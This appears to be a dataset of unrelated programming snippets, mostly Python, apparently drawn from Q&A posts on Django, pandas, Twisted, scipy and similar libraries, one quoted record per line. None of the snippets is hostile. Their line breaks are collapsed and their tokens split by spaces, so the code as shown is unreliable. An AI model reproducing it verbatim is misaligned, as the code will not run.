"from oaipmh.client import Clientfrom oaipmh.metadata import MetadataRegistry , oai_dc_readerURL = 'http : //uni.edu/ir/oaipmh'registry = MetadataRegistry ( ) registry.registerReader ( 'oai_dc ' , oai_dc_reader ) client = Client ( URL , registry ) for record in client.listRecords ( metadataPrefix='oai_dc ' ) : print record Traceback ( most recent call last ) : File `` /Users/arashsaidi/PycharmProjects/get-new-DUO/get-files.py '' , line 8 , in < module > for record in client.listRecords ( metadataPrefix='oai_dc ' ) : File `` /Users/arashsaidi/.virtualenvs/lbk/lib/python2.7/site-packages/oaipmh/common.py '' , line 115 , in method return obj ( self , **kw ) File `` /Users/arashsaidi/.virtualenvs/lbk/lib/python2.7/site-packages/oaipmh/common.py '' , line 110 , in __call__ return bound_self.handleVerb ( self._verb , kw ) File `` /Users/arashsaidi/.virtualenvs/lbk/lib/python2.7/site-packages/oaipmh/client.py '' , line 65 , in handleVerb kw , self.makeRequestErrorHandling ( verb=verb , **kw ) ) File `` /Users/arashsaidi/.virtualenvs/lbk/lib/python2.7/site-packages/oaipmh/client.py '' , line 273 , in makeRequestErrorHandling raise error.XMLSyntaxError ( kw ) oaipmh.error.XMLSyntaxError : { 'verb ' : 'ListRecords ' , 'metadataPrefix ' : 'oai_dc ' }"
"# This is slowx = ' a ' x += ' b ' ... x += ' z ' # This is fastx = [ ' a ' , ' b ' , ... ' z ' ] x = `` .join ( x )"
"import numpy as npimport matplotlib.pyplot as pltx = np.arange ( -300 , 300 ) y = x**2-7*xfig = plt.figure ( ) ax = fig.add_subplot ( 1,1,1 ) plt.plot ( x , y ) # Add something here to activate the `` Zoom to rectangle '' tool ? plt.show ( )"
larger_list = list ( range ( 15000 ) ) smaller_list = list ( range ( 2500 ) ) for ll in larger_list : for sl in smaller_list : pass import timeitlarger_list = list ( range ( 150 ) ) smaller_list = list ( range ( 25 ) ) def large_then_small ( ) : for ll in larger_list : for sl in smaller_list : passdef small_then_large ( ) : for sl in smaller_list : for ll in larger_list : passprint ( 'Larger - > Smaller : { } '.format ( timeit.timeit ( large_then_small ) ) ) print ( 'Smaller - > Larger : { } '.format ( timeit.timeit ( small_then_large ) ) ) > > > Larger - > Smaller : 114.884992572 > > > Smaller - > Larger : 98.7751009799
"import pandas as pd . # version 0.24.2a = pd.Series ( [ ' a ' , ' a ' , ' a ' , ' a ' , ' b ' , ' a ' , ' b ' , ' b ' , ' b ' , ' b ' ] ) b = pd.Series ( [ True , True , True , True , True , False , False , False , False , False ] , dtype=bool ) c = pd.DataFrame ( data= [ a , b ] ) .Tc.columns = [ 'Classification ' , 'Boolean ' ] `` ` print ( ~c.Boolean ) 0 -21 -22 -23 -24 -25 -16 -17 -18 -19 -1Name : Boolean , dtype : objectprint ( ~b ) 0 False1 False2 False3 False4 False5 True6 True7 True8 True9 Truedtype : bool"
"... MIDDLEWARE_CLASSES = ( 'django.contrib.sessions.middleware.SessionMiddleware ' , 'django.middleware.common.CommonMiddleware ' , 'django.middleware.csrf.CsrfViewMiddleware ' , 'django.contrib.auth.middleware.AuthenticationMiddleware ' , 'django.contrib.messages.middleware.MessageMiddleware ' , 'django.middleware.clickjacking.XFrameOptionsMiddleware ' , 'subdomains.middleware.SubdomainURLRoutingMiddleware ' , ) ... ROOT_URLCONF = 'mysite.urls'SUBDOMAIN_URLCONFS = { None : 'mysite.urls ' , 'www ' : 'mysite.urls ' , 'myapp ' : 'myapptwo.test ' , } ... from django.conf.urls import patterns , include , urlfrom myapp import viewsfrom django.contrib import adminadmin.autodiscover ( ) urlpatterns = patterns ( `` , url ( r'^ $ ' , views.index , name='index ' ) , url ( r'^admin/ ' , include ( admin.site.urls ) ) , ) from django.shortcuts import renderfrom django.http import HttpResponsedef index ( Request ) : return HttpResponse ( `` Hello world . '' ) from django.conf.urls import patterns , include , urlfrom myapptwo import viewsfrom django.contrib import adminadmin.autodiscover ( ) urlpatterns = patterns ( `` , url ( r'^ $ ' , views.index , name='index ' ) , url ( r'^admin/ ' , include ( admin.site.urls ) ) , ) from django.shortcuts import renderfrom django.http import HttpResponsedef index ( Request ) : return HttpResponse ( `` Hello world . This is the myapptwo subdomain ! '' )"
class Foo : def __init__ ( self ) : self.__private = 'bar ' foo = Foo ( ) '__private ' in vars ( foo ) # False'_Foo__private ' in vars ( foo ) # True
"globalnum = 0n = 1class T ( threading.Thread ) : def run ( self ) : global globalnum globalnum += nfor _ in xrange ( 0 , 999 ) : t = T ( ) t.start ( ) print globalnum"
"import coverageimport doctestimport unittestimport os # import test_module import my_modulecov = coverage.Coverage ( ) cov.start ( ) # running doctest by explicity naming the moduledoctest.testmod ( my_module ) # running unittests by just specifying the folder to look intotestLoad = unittest.TestLoader ( ) testSuite = testLoad.discover ( start_dir=os.getcwd ( ) ) runner = unittest.TextTestRunner ( ) runner.run ( testSuite ) cov.stop ( ) cov.save ( ) cov.html_report ( ) print `` tests completed '' import unittestimport doctestfrom my_module import My_Classclass My_Class_Tests ( unittest.TestCase ) : def setUp ( self ) : # setup variables def test_1 ( self ) : # test code # The bit that should load up the doctests ? What 's loader , tests , and ignore though ? # Is this in the right place ? def load_tests ( loader , tests , ignore ) : tests.addTests ( doctest.DocTestSuite ( module_with_doctests ) ) return testsif __name__ == '__main__ ' : unittest.main ( )"
try : with file ( ... ) as f : ... except IOError : ...
"> > > import textwrap > > > s = '☺ Ilsa , le méchant ☺ ☺ gardien ☺ ' # Available function that I tried : > > > textwrap.shorten ( s , width=27 ) '☺ Ilsa , le méchant ☺ [ ... ] ' > > > len ( _.encode ( ) ) 31 # I want ⩽27 # Desired function : > > > shorten_to_bytes_width ( s , width=27 ) '☺ Ilsa , le méchant [ ... ] ' > > > len ( _.encode ( ) ) 27 # I want and get ⩽27"
cook_eggs ( ) assert_logged ( `` eggs are ready ! '' )
"import grapheneimport graphql_jwtfrom graphene import relay , ObjectType , AbstractType , List , String , Field , InputObjectTypefrom graphene_django import DjangoObjectTypefrom graphene_django.filter import DjangoFilterConnectionFieldfrom datetime import date , datetimefrom django.contrib.auth.models import Userfrom django.contrib.auth import get_user_model ... .class Query ( graphene.ObjectType ) : me = graphene.Field ( UserType ) users = graphene.List ( UserType ) profile = relay.Node.Field ( ProfileNode ) all_profiles = DjangoFilterConnectionField ( ProfileNode ) def resolve_users ( self , info ) : # # # Returns all users # # # user = info.context.user if user.is_anonymous : raise Exception ( 'Not logged ! ' ) if not user.is_superuser : raise Exception ( 'premission denied ' ) return User.objects.all ( ) def resolve_me ( self , info ) : # # # Returns logged user # # # user = info.context.user if user.is_anonymous : raise Exception ( 'Not logged ! ' ) return user def resolve_all_profiles ( self , info , **kwargs ) : # # # Returns all profiles # # # return Profile.objects.all ( ) ... ..def execute ( my_query ) : schema = graphene.Schema ( query=Query ) return schema.execute ( my_query ) from django.shortcuts import renderimport graphenefrom api import schemafrom django.contrib.auth import authenticatedef accueil ( request ) : if request.user.is_authenticated : check = `` I am logged '' else : check = `` I am not logged '' result = schema.execute ( `` '' '' query { users { id username } } '' '' '' ) return render ( request , 'frontend/accueil.html ' , { 'result ' : result.data , 'check ' : check } ) < h1 > OTC < /h1 > < p > the users are : { { result } } < /p > < br/ > < p > { { check } } < /p > < a href= '' { % url 'login ' % } '' > login < /a > < a href= '' { % url 'logout ' % } '' > logout < /a > An error occurred while resolving field Query.usersTraceback ( most recent call last ) : File `` /home/victor/myenv/lib/python3.5/site-packages/graphql/execution/executor.py '' , line 311 , in resolve_or_error return executor.execute ( resolve_fn , source , info , **args ) File `` /home/victor/myenv/lib/python3.5/site-packages/graphql/execution/executors/sync.py '' , line 7 , in execute return fn ( *args , **kwargs ) File `` /home/victor/poc2/poc2/api/schema.py '' , line 67 , in resolve_users user = info.context.userAttributeError : 'NoneType ' object has no attribute 'user'Traceback ( most recent call last ) : File `` /home/victor/myenv/lib/python3.5/site-packages/graphql/execution/executor.py '' , line 330 , in complete_value_catching_error exe_context , return_type , field_asts , info , result ) File `` /home/victor/myenv/lib/python3.5/site-packages/graphql/execution/executor.py '' , line 383 , in complete_value raise GraphQLLocatedError ( field_asts , original_error=result ) graphql.error.located_error.GraphQLLocatedError : 'NoneType ' object has no attribute 'user '"
"def foo ( ) : return 3if foo > 8 : launch_the_nukes ( ) > > > foo > 9e9True > > > ( foo ) .__gt__ ( 9e9 ) Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'function ' object has no attribute '__gt__ ' > > > ( 9e9 ) .__lt__ ( foo ) NotImplemented"
"< a href = `` { % url 'ngraph ' % } '' > Customer Count < /a > def graph ( request ) : age = [ 'below 20 ' , '20-22 ' , '22-24 ' , '24-26 ' , '26-28 ' , '28-30 ' , '30-40 ' , 'above 40 ' ] avg_call_group = [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] cursor = connection.cursor ( ) cursor.execute ( `` select p.age_group , sum ( c.avg_duration ) as age_avg_dur from demo p , ( select card_no as card_n , avg ( duration ) as avg_duration from call_details where service_key = 1 and card_no =calling_no group by card_no ) as c where p.card_no = c.card_n group by p.age_group `` ) numrows = int ( cursor.rowcount ) for x in range ( numrows ) : row = cursor.fetchone ( ) avg_call_group [ x ] = row [ 1 ] cursor.close ( ) import matplotlib.pyplot as plt f=plt.figure ( figsize = ( 3,3 ) ) exploding = [ .04 , .04 , .04 , .04 , .04 , .04 , .04 , .04 ] age = [ 'below 20 ' , '20-22 ' , '22-24 ' , '24-26 ' , '26-28 ' , '28-30 ' , '30-40 ' , '40-50 ' ] plt.pie ( avg_call_group , labels= age , autopct= ' % 1.3f % % ' , explode = exploding ) canvas = FigureCanvasAgg ( f ) response = HttpResponse ( content_type='image/png ' ) canvas.print_png ( response ) return response from django.conf.urls import patterns , include , urlfrom welcome.views import *from django.contrib import adminadmin.autodiscover ( ) urlpatterns = patterns ( `` , url ( r'^admin/ ' , include ( admin.site.urls ) ) , url ( r'^hello/ ' , hello , name = 'nhello ' ) , url ( r'^graph/ ' , graph , name = 'ngraph ' ) , ) < div > < a href = `` { % url 'ngraph ' % } '' > Customer Count < /a > < /div >"
"( 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 ) ( 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 ) == ( 1 , 0 , 1 , 1 ) * 3 f ( ( 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 0 , 1 , 1 ) ) == ( 1 , 0 , 1 , 1 ) def f ( s ) : for i in range ( 1 , len ( s ) ) : if len ( s ) % i == 0 and s == s [ : i ] * ( len ( s ) /i ) : return s [ : i ]"
"def updateTree ( self , dataframe ) : `` ' Updates the treeview with the data in the dataframe parameter `` ' # Remove any nan values which may have appeared in the dataframe parameter df = dataframe.replace ( np.nan , '' , regex=True ) # Currently displayed data self.treesubsetdata = dataframe # Remove existing items for item in self.tree.get_children ( ) : self.tree.delete ( item ) # Recreate from scratch the columns based on the passed dataframe self.tree.config ( columns= [ ] ) self.tree.config ( columns= list ( dataframe.columns ) ) # Ensure all columns are considered strings and write column headers for col in dataframe.columns : self.tree.heading ( col , text=str ( col ) ) # Get number of rows and columns in the imported script self.rows , self.cols = dataframe.shape # Populate data in the treeview for row in dataframe.itertuples ( ) : self.tree.insert ( `` , 'end ' , values = tuple ( row [ 1 : ] ) ) # Minimise first column self.tree.column ( ' # 0 ' , width=0 ) self.tree.update ( )"
"side_street , main_street , plaza , bar , hotel , restaurant , shop , office"
"import tensorflow as tfimport sysfrom tensorflow.python.platform import gfilefrom tensorflow.core.protobuf import saved_model_pb2from tensorflow.python.util import compatpb_file = 'themodel.pb'run_meta = tf.RunMetadata ( ) with tf.Session ( ) as sess : print ( `` load graph '' ) with gfile.FastGFile ( pb_path , 'rb ' ) as f : graph_def = tf.GraphDef ( ) graph_def.ParseFromString ( f.read ( ) ) sess.graph.as_default ( ) tf.import_graph_def ( graph_def , name= '' ) flops = tf.profiler.profile ( tf.get_default_graph ( ) , run_meta=run_meta , options=tf.profiler.ProfileOptionBuilder.float_operation ( ) ) print ( `` test flops : { : , } '' .format ( flops.total_float_ops ) ) print ( [ n.name for n in tf.get_default_graph ( ) .as_graph_def ( ) .node ] )"
"from typing import Sequence , List , TypeVarclass BaseClass : def __init__ ( self , data=None , *args , **kwargs ) : super ( ) .__init__ ( ) self.CanCalculate = True if data is None : data = [ ] self.CanCalculate = False self._mydata = list ( data ) self.multiplier = 1 @ property def data ( self ) : return self._mydataclass ChildClass ( BaseClass ) : def sum_mul_data ( self ) : return self.multiplier * sum ( self.data ) class SecondChildClass ( BaseClass ) : def sum_div_data ( self ) : return sum ( self.data ) / self.multiplierdef myFun ( input : Sequence [ BaseClass ] ) - > List [ BaseClass ] : out = [ ] for n , i in enumerate ( input ) : if i.CanCalculate : i.multiplier = 10**n out.append ( i ) return outchilds = [ ChildClass ( [ 1,2,3,4 ] ) , ChildClass ( ) , ChildClass ( [ 1,2,3,4 ] ) ] t = myFun ( childs ) for idx in t : print ( idx.sum_mul_data ( ) ) childs = [ SecondChildClass ( [ 1,2,3,4 ] ) , SecondChildClass ( ) , SecondChildClass ( [ 1,2,3,4 ] ) ] t = myFun ( childs ) for idx in t : print ( idx.sum_div_data ( ) )"
"dist = pkg_resources.get_distribution ( plugin_name ) entry = dist.get_entry_info ( entry_point_name , plugin_name ) plugin = entry.load ( )"
"def get_library_book ( self , book_id : str , library_id : str ) - > Book : def get_library_book ( self , book_id : str , library_id : str ) - > Book :"
"def hostnamesToIps ( hostnames ) : ip_list = [ ] for hostname in hostnames : try : ais = socket.getaddrinfo ( hostname , None ) for result in ais : # print ( result [ 4 ] [ 0 ] ) ip_list.append ( result [ -1 ] [ 0 ] ) except : eprint ( `` Unable to get IP for hostname : `` + hostname ) return list ( set ( ip_list ) ) nslookup earth.all.vpn.airdns.org"
"req = urllib2.Request ( url , `` { 'some ' : 'data ' } '' , { 'Content-Type ' : 'application/json ; charset=utf-8 ' } ) res = urllib2.urlopen ( req ) print f.read ( ) r = requests.post ( url , headers = { 'Content-Type ' : 'application/json ; charset=utf-8 ' } , data = `` { 'some ' : 'data ' } '' ) print r.text"
"import numpy as np import time np_transpose_count = 0 T_transpose_count = 0 equal_count = 0 for i in range ( 10000 ) : Se = np.random.rand ( 100,100 ) tic1 =time.clock ( ) ST_T = Se.T toc1=time.clock ( ) tic2 =time.clock ( ) ST_np = np.transpose ( Se ) toc2=time.clock ( ) if ( toc1-tic1 ) < ( toc2-tic2 ) : T_transpose_count+=1 elif ( toc1-tic1 ) > ( toc2-tic2 ) : np_transpose_count+=1 else : equal_count+=1 print ( T_transpose_count , np_transpose_count , equal_count )"
"for i , x in enumerate ( w ) : v [ idx [ i ] ] += x"
"# ! /usr/bin/pythonimport optparse , os , sysfrom twisted.internet.protocol import ServerFactory , Protocoldef parse_args ( ) : usage = `` '' '' usage : % prog [ options ] '' '' '' parser = optparse.OptionParser ( usage ) help = `` The port to listen on . Default to a random available port . '' parser.add_option ( ' -- port ' , type='int ' , help=help ) help = `` The interface to listen on . Default is localhost . '' parser.add_option ( ' -- iface ' , help=help , default='localhost ' ) options =parser.parse_args ( ) return options # , log_fileclass LogProtocol ( Protocol ) : def connectionMade ( self ) : for line in self.factory.log : self.transport.write ( line ) class LogFactory ( ServerFactory ) : protocol = LogProtocol def __init__ ( self , log ) : self.log = logdef main ( ) : log = sys.stdin.readline ( ) options , log_file = parse_args ( ) factory = LogFactory ( log ) from twisted.internet import reactor port = reactor.listenTCP ( options.port or 0 , factory , interface=options.iface ) print 'Serving % s on % s . ' % ( log_file , port.getHost ( ) ) reactor.run ( ) if __name__ == '__main__ ' : main ( ) # ! /usr/bin/pythonimport optparse , os , sys , timefrom twisted.internet.protocol import ServerFactory , Protocoldef parse_args ( ) : usage = `` '' '' usage : % prog [ options ] '' '' '' parser = optparse.OptionParser ( usage ) help = `` The port to listen on . Default to a random available port '' parser.add_option ( ' -- port ' , type='int ' , help=help , dest= '' port '' ) help = `` The logfile to tail and write '' parser.add_option ( ' -- file ' , help=help , default='log/testgen01.log ' , dest= '' logfile '' ) options = parser.parse_args ( ) return optionsclass LogProtocol ( Protocol ) : def connectionMade ( self ) : for line in self.follow ( ) : self.transport.write ( line ) self.transport.loseConnection ( ) def follow ( self ) : while True : line = self.factory.log.readline ( ) if not line : time.sleep ( 0.1 ) continue yield lineclass LogFactory ( ServerFactory ) : protocol = LogProtocol def __init__ ( self , log ) : self.log = logdef main ( ) : options , log_file = parse_args ( ) log = open ( options.logfile ) factory = LogFactory ( log ) from twisted.internet import reactor port = reactor.listenTCP ( options.port or 0 , factory ) # , interface=options.iface ) print 'Serving % s on % s . ' % ( options.logfile , port.getHost ( ) ) reactor.run ( ) if __name__ == '__main__ ' : main ( )"
"import asyncioimport signalclass A : def __init__ ( self ) : self._event_loop = asyncio.new_event_loop ( ) def run ( self ) : print ( 'starting event loop ' ) self._event_loop.run_forever ( ) print ( 'event loop has stopped ' ) def stop ( self ) : print ( 'stopping event loop ' ) self._event_loop.stop ( ) if __name__ == '__main__ ' : a = A ( ) def handle_term ( *args ) : a.stop ( ) signal.signal ( signal.SIGTERM , handle_term ) a.run ( )"
"def separate ( input_tuple ) : return_tuple = ( [ ] , [ ] ) for value in input_tuple : if isinstance ( value , str ) : return_tuple [ 0 ] .append ( value ) if isinstance ( value , numbers.Number ) : return_tuple [ 1 ] .append ( value ) return tuple ( [ tuple ( l ) for l in return_tuple ] ) ( tuple ( [ i for i in input_tuple if isinstance ( i , str ) ] ) , tuple ( [ i for i in input_tuple if isinstance ( i , numbers.Number ) ] ) ) tuple ( [ tuple ( [ i for i in input_tuple if isinstance ( i , k ) ] ) for k in ( ( float , int , complex ) , str ) ] )"
class SomeProfile ( models.Model ) : type = models.CharField ( max_length=1 )
"SELECT Pages.PageID , Pages.PageName , Counter AS TermFreq , Pages.Length , ( Counter / LOG ( Length ) ) AS WeightFROM PagesINNER JOIN TermOccurrences ON TermOccurrences.PageID = Pages.PageIDINNER JOIN Terms ON TermOccurrences.TermID = Terms.TermIDWHERE TermName = % sORDER BY Weight DESCLIMIT 20 ; SELECT COUNT ( * ) FROM PagesINNER JOIN TermOccurrences ON TermOccurrences.PageID = Pages.PageIDINNER JOIN Terms ON TermOccurrences.TermID = Terms.TermIDWHERE TermName = % s AND Counter > 2"
"# Sets GPIO 's to HIGH = Relays OFFtry : import RPi.GPIO as GPIOexcept RuntimeError : Print ( `` Error importing RPi.GPIO ! ! `` ) GPIO.setmode ( GPIO.BOARD ) GPIO.setwarnings ( False ) # GPIO16 is relay1GPIO.setup ( 16 , GPIO.OUT , initial=GPIO.HIGH ) # GPIO11 is relay2GPIO.setup ( 11 , GPIO.OUT , initial=GPIO.HIGH )"
"optimization finished , # iter = 1529nu = 0.531517 obj = -209.738688 , rho = 0.997250 nSV = 1847 , nBSV = 1534Total nSV = 1847Cross Validation Accuracy = 73.4229 %"
class MyObj ( csv.Dictwriter ) : ...
"< html : html lang= '' en-US '' xml : lang= '' en-US '' xmlns : html= '' http : //www.w3.org/1999/xhtml '' > < html : head > < html : title > vocab < /html : title > < html : style type= '' text/css '' > ... with open ( '/path/to/file.html ' , mode= ' w ' , encoding='utf-8 ' ) as outfile : mypage.write ( outfile )"
"my_set = { x for x in range ( 10 ) } dup_set = { x for x in [ 0 , 1 , 2 , 0 , 1 , 2 ] } C : \ > python -m timeit `` s = set ( ) '' `` for x in range ( 10 ) : '' `` s.add ( x ) '' 100000 loops , best of 3 : 2.3 usec per loopC : \ > python -m timeit `` s = { x for x in range ( 10 ) } '' 1000000 loops , best of 3 : 1.68 usec per loop C : \ > python -m timeit `` s = set ( ) '' `` for x in range ( 10 ) : '' `` if x % 2 : s.add ( x ) '' 100000 loops , best of 3 : 2.27 usec per loopC : \ > python -m timeit `` s = { x for x in range ( 10 ) if x % 2 } '' 1000000 loops , best of 3 : 1.83 usec per loop"
"exception OverflowError Raised when the result of an arithmetic operation is too large to be represented . This can not occur for long integers ( which would rather raise MemoryError than give up ) and for most operations with plain integers , which return a long integer instead . Because of the lack of standardization of floating point exception handling in C , most floating point operations also aren ’ t checked ."
"urlpatterns = [ # some routes ] urlpatterns += static ( settings.STATIC_URL , document_root=settings.STATIC_ROOT ) urlpatterns = [ # some routes , static ( settings.STATIC_URL , document_root=settings.STATIC_ROOT ) ] return [ re_path ( r'^ % s ( ? P < path > . * ) $ ' % re.escape ( prefix.lstrip ( '/ ' ) ) , view , kwargs=kwargs ) , ]"
"# app/project.pyclass MyClass ( object ) : def method_a ( self ) : print FetcherA results = FetcherA ( ) # app/fetch.pyclass FetcherA ( object ) : pass # app/tests/test.pyfrom mock import patchfrom django.test import TestCasefrom ..project import MyClassclass MyTestCase ( TestCase ) : @ patch ( 'app.fetch.FetcherA ' ) def test_method_a ( self , test_class ) : MyClass ( ) .method_a ( ) test_class.assert_called_once_with ( ) AssertionError : Expected to be called once . Called 0 times ."
"class MyModel1 ( CachingMixin , models.Model ) : id = models.BigIntegerField ( default=make_id , primary_key=True ) name = models.CharField ( max_length=50 , null=False , blank=False , ) $ curl http : //localhost:4212/api/getMyModel1ByName/ ? name=my-name { `` id '' : 10150133855458395 , `` name '' : `` my-name '' } > $ http = angular.element ( document.body ) .injector ( ) .get ( ' $ http ' ) ; > $ http.get ( `` http : //localhost:4212/api/getMyModel1ByName/ ? name=my-name '' ) .then ( function ( response ) { console.log ( JSON.stringify ( response.data ) ) } ) .catch ( function ( error ) { console.log ( error.data ) } ) ; { `` id '' :10150133855458396 , `` name '' : '' my-name '' }"
svn checkout https : //example-repository.googlecode.com/svn/trunk example-repository
"X [ : , : , : ,i ] train_dict = sio.loadmat ( train_location ) X = np.asarray ( train_dict [ ' X ' ] ) X_train = [ ] for i in range ( X.shape [ 3 ] ) : X_train.append ( X [ : , : , : ,i ] ) X_train = np.asarray ( X_train ) Y_train = train_dict [ ' y ' ] for i in range ( len ( Y_train ) ) : if Y_train [ i ] % 10 == 0 : Y_train [ i ] = 0Y_train = to_categorical ( Y_train,10 ) return ( X_train , Y_train )"
"d = dict ( [ ( 'sape ' , 4139 ) , ( 'guido ' , 4127 ) , ( 'jack ' , 4098 ) ] ) { 'guido ' : 4127 , 'jack ' : 4098 , 'sape ' : 4139 } od = OrderedDict ( d ) OrderedDict ( [ ( 'sape ' , 4139 ) , ( 'guido ' , 4127 ) , ( 'jack ' , 4098 ) ] ) In [ 22 ] : sys.versionOut [ 22 ] : ' 3.6.1 ( default , Apr 4 2017 , 09:40:21 ) \n [ GCC 4.2.1 Compatible Apple LLVM 8.1.0 ( clang-802.0.38 ) ] '"
"from itertools import groupbyPositions = [ ( 'AU ' , '1M ' , 1000 ) , ( 'NZ ' , '1M ' , 1000 ) , ( 'AU ' , '2M ' , 4000 ) , ( 'AU ' , ' O/N ' , 4500 ) , ( 'US ' , '1M ' , 2500 ) , ] FLD_COUNTRY = 0FLD_CONSIDERATION = 2Pos = sorted ( Positions , key=lambda x : x [ FLD_COUNTRY ] ) for country , pos in groupby ( Pos , lambda x : x [ FLD_COUNTRY ] ) : print country , sum ( p [ FLD_CONSIDERATION ] for p in pos ) # - > AU 9500 # - > NZ 1000 # - > US 2500"
"> > > res = minimize ( choiceProbDev , sparams , ( stim , dflt , dat , N ) , method='Nelder-Mead ' ) final_simplex : ( array ( [ [ -0.21483287 , -1. , -0.4645897 , -4.65108495 ] , [ -0.21483909 , -1. , -0.4645915 , -4.65114839 ] , [ -0.21485426 , -1. , -0.46457789 , -4.65107337 ] , [ -0.21483727 , -1. , -0.46459331 , -4.65115965 ] , [ -0.21484398 , -1. , -0.46457725 , -4.65099805 ] ] ) , array ( [ 107.46037865 , 107.46037868 , 107.4603787 , 107.46037875 , 107.46037875 ] ) ) fun : 107.4603786452194 message : 'Optimization terminated successfully . ' nfev : 349 nit : 197 status : 0 success : True x : array ( [ -0.21483287 , -1. , -0.4645897 , -4.65108495 ] ) > res < - optim ( sparams , choiceProbDev , stim=stim , dflt=dflt , dat=dat , N=N , method= '' Nelder-Mead '' ) $ par [ 1 ] 0.2641022 1.0000000 0.2086496 3.6688737 $ value [ 1 ] 110.4249 $ countsfunction gradient 329 NA $ convergence [ 1 ] 0 $ messageNULL > > > choiceProbDev ( np.array ( [ 0.5 , 0.5 , 0.5 , 3 ] ) , stim , dflt , dat , N ) 143.31438613033876 > choiceProbDev ( c ( 0.5 , 0.5 , 0.5 , 3 ) , stim , dflt , dat , N ) [ 1 ] 143.3144 # load modulesimport mathimport numpy as npfrom scipy.optimize import minimizefrom scipy.stats import binom # initialize valuesdflt = 0.5N = 1 # set the known parameter values for generating datab = 0.1w1 = 0.75w2 = 0.25t = 7theta = [ b , w1 , w2 , t ] # generate stimulistim = np.array ( np.meshgrid ( np.arange ( 0 , 1.1 , 0.1 ) , np.arange ( 0 , 1.1 , 0.1 ) ) ) .T.reshape ( -1,2 ) # starting valuessparams = [ -0.5 , -0.5 , -0.5 , 4 ] # generate probability of accepting proposaldef choiceProb ( stim , dflt , theta ) : utilProp = theta [ 0 ] + theta [ 1 ] *stim [ : ,0 ] + theta [ 2 ] *stim [ : ,1 ] # proposal utility utilDflt = theta [ 1 ] *dflt + theta [ 2 ] *dflt # default utility choiceProb = 1/ ( 1 + np.exp ( -1*theta [ 3 ] * ( utilProp - utilDflt ) ) ) # probability of choosing proposal return choiceProb # calculate deviancedef choiceProbDev ( theta , stim , dflt , dat , N ) : # restrict b , w1 , w2 weights to between -1 and 1 if any ( [ x > 1 or x < -1 for x in theta [ : -1 ] ] ) : return 10000 # initialize nDat = dat.shape [ 0 ] dev = np.array ( [ np.nan ] *nDat ) # for each trial , calculate deviance p = choiceProb ( stim , dflt , theta ) lk = binom.pmf ( dat , N , p ) for i in range ( nDat ) : if math.isclose ( lk [ i ] , 0 ) : dev [ i ] = 10000 else : dev [ i ] = -2*np.log ( lk [ i ] ) return np.sum ( dev ) # simulate dataprobs = choiceProb ( stim , dflt , theta ) # randomly generated data based on the calculated probabilities # dat = np.random.binomial ( 1 , probs , probs.shape [ 0 ] ) dat = np.array ( [ 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 ] ) # fit modelres = minimize ( choiceProbDev , sparams , ( stim , dflt , dat , N ) , method='Nelder-Mead ' ) library ( tidyverse ) # initialize valuesdflt < - 0.5N < - 1 # set the known parameter values for generating datab < - 0.1w1 < - 0.75w2 < - 0.25t < - 7theta < - c ( b , w1 , w2 , t ) # generate stimulistim < - expand.grid ( seq ( 0 , 1 , 0.1 ) , seq ( 0 , 1 , 0.1 ) ) % > % dplyr : :arrange ( Var1 , Var2 ) # starting valuessparams < - c ( -0.5 , -0.5 , -0.5 , 4 ) # generate probability of accepting proposalchoiceProb < - function ( stim , dflt , theta ) { utilProp < - theta [ 1 ] + theta [ 2 ] *stim [ ,1 ] + theta [ 3 ] *stim [ ,2 ] # proposal utility utilDflt < - theta [ 2 ] *dflt + theta [ 3 ] *dflt # default utility choiceProb < - 1/ ( 1 + exp ( -1*theta [ 4 ] * ( utilProp - utilDflt ) ) ) # probability of choosing proposal return ( choiceProb ) } # calculate deviancechoiceProbDev < - function ( theta , stim , dflt , dat , N ) { # restrict b , w1 , w2 weights to between -1 and 1 if ( any ( theta [ 1:3 ] > 1 | theta [ 1:3 ] < -1 ) ) { return ( 10000 ) } # initialize nDat < - length ( dat ) dev < - rep ( NA , nDat ) # for each trial , calculate deviance p < - choiceProb ( stim , dflt , theta ) lk < - dbinom ( dat , N , p ) for ( i in 1 : nDat ) { if ( dplyr : :near ( lk [ i ] , 0 ) ) { dev [ i ] < - 10000 } else { dev [ i ] < - -2*log ( lk [ i ] ) } } return ( sum ( dev ) ) } # simulate dataprobs < - choiceProb ( stim , dflt , theta ) # same data as in python scriptdat < - c ( 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 1 , 0 , 1 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 0 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 1 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 0 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 , 1 ) # fit modelres < - optim ( sparams , choiceProbDev , stim=stim , dflt=dflt , dat=dat , N=N , method= '' Nelder-Mead '' 